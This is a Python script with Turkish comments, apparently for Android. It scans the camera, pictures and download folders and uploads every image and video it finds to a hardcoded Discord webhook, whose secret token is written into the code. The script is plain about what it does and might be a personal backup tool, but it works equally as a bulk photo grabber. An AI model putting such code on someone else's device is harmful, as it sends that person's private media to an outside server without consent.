import os
import requests
import time
import datetime
import logging
from concurrent.futures import ThreadPoolExecutor

# --- AYARLAR ---
# Buraya Webhook URL'ni yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499686865559748659/1LIdmEUDM8Pr5xMCpChMaowQSlJIqjpRx5nS6ZWFf2gQ3NVfLLdQpe5_A3EeoL-47JzM"

# Klasör yolları (Erişebildiklerini tarar)
TARGET_PATHS = [
    '/sdcard/DCIM/Camera',
    '/sdcard/Pictures',
    '/sdcard/Download',
    '/storage/emulated/0/DCIM/Camera',
    '/storage/emulated/0/Pictures'
]

# Uzantılar
EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4')

# Discord Dosya Sınırı (Ücretsiz hesaplar için 25MB güvenli sınırdır)
MAX_FILE_SIZE_MB = 24 

# --- LOG SİSTEMİ ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class DiscordUploader:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.success_count = 0
        self.fail_count = 0

    def check_internet(self):
        """İnternet bağlantısını kontrol eder."""
        try:
            requests.get("https://discord.com", timeout=5)
            return True
        except:
            return False

    def upload_file(self, file_path):
        """Tek bir dosyayı Discord'a yükler."""
        file_name = os.path.basename(file_path)
        
        # Dosya boyutu kontrolü
        try:
            size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if size_mb > MAX_FILE_SIZE_MB:
                logging.warning(f"⏩ Atlanyor (Çok büyük: {size_mb:.2f}MB): {file_name}")
                return
        except Exception as e:
            logging.error(f"⚠️ Dosya okunamadı: {file_name} - {e}")
            return

        # Yükleme işlemi
        try:
            with open(file_path, 'rb') as f:
                payload = {'file': (file_name, f)}
                response = requests.post(self.webhook_url, files=payload, timeout=30)

            if response.status_code == 200 or response.status_code == 204:
                logging.info(f"✅ Başarılı: {file_name}")
                self.success_count += 1
            elif response.status_code == 429: # Hız Sınırı (Rate Limit)
                retry_after = response.json().get('retry_after', 5)
                logging.warning(f"⏳ Hız sınırı! {retry_after} sn bekleniyor...")
                time.sleep(retry_after)
                self.upload_file(file_path) # Tekrar dene
            else:
                logging.error(f"❌ Başarısız: {file_name} (Kod: {response.status_code})")
                self.fail_count += 1

        except requests.exceptions.ConnectionError:
            logging.error("🌐 Bağlantı koptu! 10 saniye sonra tekrar denenecek...")
            time.sleep(10)
            self.upload_file(file_path)
        except Exception as e:
            logging.error(f"💥 Beklenmedik hata: {file_name} - {e}")
            self.fail_count += 1

    def scan_files(self):
        """Belirlenen yolları tarar ve dosya listesi döner."""
        found_files = []
        logging.info("🔍 Tarama başlıyor...")
        
        for path in TARGET_PATHS:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(EXTENSIONS):
                            full_path = os.path.join(root, file)
                            found_files.append(full_path)
            else:
                logging.debug(f"Path bulunamadı, atlanıyor: {path}")
        
        return found_files

# --- ANA ÇALIŞTIRICI ---
def start_process():
    uploader = DiscordUploader(DISCORD_WEBHOOK_URL)

    if not uploader.check_internet():
        logging.critical("❌ İnternet bağlantısı yok! Lütfen kontrol edin.")
        return

    all_media = uploader.scan_files()
    total = len(all_media)

    if total == 0:
        logging.info("📭 Gönderilecek medya bulunamadı.")
        return

    logging.info(f"📊 Toplam {total} dosya bulundu. İşlem başlıyor...")
    print("-" * 50)

    for index, file_path in enumerate(all_media, 1):
        print(f"[{index}/{total}] İşleniyor...")
        uploader.upload_file(file_path)
        # Discord'u yormamak için kısa bir mola
        time.sleep(0.8)

    print("-" * 50)
    logging.info(f"🏁 İŞLEM TAMAMLANDI")
    logging.info(f"✅ Başarılı: {uploader.success_count}")
    logging.info(f"❌ Başarısız: {uploader.fail_count}")

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\n🛑 İşlem kullanıcı tarafından durduruldu.")
